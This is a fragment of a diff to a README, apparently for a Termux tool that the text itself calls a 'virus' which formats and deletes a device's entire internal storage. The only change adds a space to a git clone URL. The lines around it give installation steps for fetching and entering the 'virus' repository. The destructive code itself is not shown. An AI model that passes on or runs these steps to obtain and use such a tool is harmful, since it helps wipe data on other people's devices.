@@ -35,7 +35,7 @@ Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Us
 * `pkg install python2 -y`
 * `pkg install git -y`
 * `pip install lolcat`
-* `git clone https://github.com/isolation0/virus`
+* `git clone https://github.com/isolation0/virus `
 * `cd $HOME`
 * `ls`
 * `cd virus`
